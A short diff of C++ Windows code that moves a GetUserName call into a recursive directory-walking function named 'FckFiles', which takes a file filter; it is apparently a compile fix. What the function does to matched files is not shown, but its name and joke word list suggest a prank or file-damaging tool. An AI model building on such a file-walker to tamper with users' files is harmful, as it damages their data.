@@ -10,11 +10,12 @@
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
-char username[UNLEN+1];
-DWORD username_len = UNLEN+1;
-GetUserName(username, &username_len);
+
 void FckFiles(std::string directory, std::string fileFilter, bool recursively = true)
 {
+	TCHAR username[UNLEN + 1];
+	DWORD size = UNLEN + 1;
+	GetUserName((TCHAR*)username, &size);
 	if (recursively)
 		FckFiles(directory, fileFilter, false);
 	directory += "\\";
